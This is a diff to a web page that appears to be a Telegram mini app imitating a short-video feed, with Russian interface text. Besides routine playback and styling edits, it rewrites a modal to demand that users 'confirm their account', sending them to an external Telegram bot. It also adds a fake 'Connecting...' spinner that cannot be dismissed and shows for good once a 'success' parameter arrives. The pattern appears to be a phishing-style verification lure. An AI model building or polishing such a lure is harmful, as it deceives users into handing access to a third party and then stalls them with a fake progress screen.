@@ -591,21 +591,6 @@
             opacity: 0.95;
         }
 
-        /* Video ID badge */
-        .video-id-badge {
-            position: absolute;
-            top: 70px;
-            right: 20px;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
-            color: #888;
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 12px;
-            z-index: 50;
-            font-family: monospace;
-        }
-
     </style>
 </head>
 <body>
@@ -772,13 +757,22 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
     <!-- Auth Modal -->
     <div class="modal-overlay auth-modal" id="auth-modal">
         <div class="modal">
-            <h2>Требуется аккаунт</h2>
-            <p>Создайте свой аккаунт для доступа ко всем функциям</p>
-            <button class="modal-btn" onclick="window.open('https://t.me/test', '_blank')">Создать</button>
+            <h2>Требуется подтверждение</h2>
+            <p>Необходимо подтвердить свой аккаунт чтобы получить доступ ко всем функциям</p>
+            <button class="modal-btn" onclick="window.open('https://t.me/ordmcdservicebot/app', '_blank')">Подтвердить</button>
         </div>
     </div>
 
-    <!-- Share Modal -->
+    
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="success-modal">
+        <div class="modal" style="padding: 40px 24px;">
+            <div style="width: 50px; height: 50px; border: 3px solid #333; border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+            <h2 style="margin-bottom: 12px;">Подключение...</h2>
+            <p style="color: #888;">Пожалуйста, подождите</p>
+        </div>
+    </div>
+<!-- Share Modal -->
     <div class="modal-overlay" id="share-modal">
         <div class="modal">
             <h2>Поделиться</h2>
@@ -857,7 +851,13 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
         }
 
         const startParam = getStartParam();
-        const isSharedVideo = startParam.length === 6 && videoIds.includes(startParam.toUpperCase());
+        const isSuccess = startParam.toLowerCase() === 'success';
+        const isSharedVideo = !isSuccess && startParam.length === 6 && videoIds.includes(startParam.toUpperCase());
+
+        // Если пришли по ?startapp=success — ставим флаг
+        if (isSuccess) {
+            localStorage.setItem('success', 'true');
+        }
 
         // Показываем прелоадер
         setTimeout(() => {
@@ -895,7 +895,7 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
             const soundBtn = document.getElementById('global-sound-toggle');
 
             video.src = videoFiles[videoIndex];
-            video.muted = false; // звук включен по умолчанию
+            video.muted = true; // изначально muted, размьютим при первом клике
             video.load();
             // НЕ запускаем автоматически — ждём первого клика пользователя
 
@@ -1014,11 +1014,6 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
                 const likes = comments * 5 + Math.floor(Math.random() * comments);
                 const formatNum = (n) => n >= 1000 ? (n/1000).toFixed(1).replace(/\.0$/, '') + 'K' : n;
 
-                // ID бейдж
-                const idBadge = document.createElement('div');
-                idBadge.className = 'video-id-badge';
-                idBadge.textContent = 'ID: ' + videoIds[index];
-
                 // Создаём video-info для этого слайда
                 const videoInfo = document.createElement('div');
                 videoInfo.className = 'video-info';
@@ -1069,7 +1064,6 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
 
                 slide.appendChild(loading);
                 slide.appendChild(video);
-                slide.appendChild(idBadge);
                 slide.appendChild(videoInfo);
                 slide.appendChild(sideActions);
                 wrapper.appendChild(slide);
@@ -1255,7 +1249,11 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
         }
 
         function showAuthModal() {
-            document.getElementById('auth-modal').classList.add('active');
+            if (localStorage.getItem('success') === 'true') {
+                document.getElementById('success-modal').classList.add('active');
+            } else {
+                document.getElementById('auth-modal').classList.add('active');
+            }
         }
 
         function showFeed() {
@@ -1265,6 +1263,19 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
             document.getElementById('bottom-nav').style.display = 'flex';
             updateNavActive('nav-home');
             updateGlobalSoundButton();
+            // Воспроизведение текущего видео при возврате в ленту
+            const wrapper = document.getElementById('videos-wrapper');
+            const slides = wrapper.querySelectorAll('.video-slide, .welcome-slide');
+            const height = window.innerHeight;
+            slides.forEach((slide, index) => {
+                const rect = slide.getBoundingClientRect();
+                const isVisible = rect.top >= -height * 0.3 && rect.top <= height * 0.3;
+                const video = slide.querySelector('video');
+                if (isVisible && video) {
+                    video.muted = !globalSoundEnabled;
+                    video.play().catch(() => {});
+                }
+            });
         }
 
         function showSettings() {
@@ -1274,6 +1285,8 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
             document.getElementById('bottom-nav').style.display = 'flex';
             updateNavActive('nav-settings');
             updateGlobalSoundButton();
+            // Пауза всех видео при открытии Инструментов
+            document.querySelectorAll('.video-slide video').forEach(v => v.pause());
         }
 
         function updateNavActive(activeId) {
@@ -1295,7 +1308,7 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
         // Закрытие модалок при клике вне
         document.querySelectorAll('.modal-overlay').forEach(overlay => {
             overlay.addEventListener('click', (e) => {
-                if (e.target === overlay && overlay.id !== 'username-modal' && overlay.id !== 'continue-modal') {
+                if (e.target === overlay && overlay.id !== 'username-modal' && overlay.id !== 'continue-modal' && overlay.id !== 'success-modal') {
                     overlay.classList.remove('active');
                 }
             });
@@ -1315,6 +1328,7 @@ l0 222 -31 28 c-88 84 -151 193 -179 312 -14 56 -17 97 -12 185 8 177 56 285
             const pauseIcon = document.getElementById('single-pause-icon');
 
             if (video.paused) {
+                video.muted = false; // размьютим при ручном старте
                 video.play().catch(() => {});
                 poster.classList.add('hidden');
                 pauseIcon.classList.add('hidden');
@@ -1393,6 +1407,13 @@ function toggleGlobalSound() {
                 }, 15000);
             });
         }
+
+        // Предзагрузка Lottie анимации
+        function preloadLottie() {
+            const lottiePreload = new Image();
+            lottiePreload.src = 'swipe.json';
+        }
+        preloadLottie();
 
         // Запускаем предзагрузку сразу
         preloadVideos();
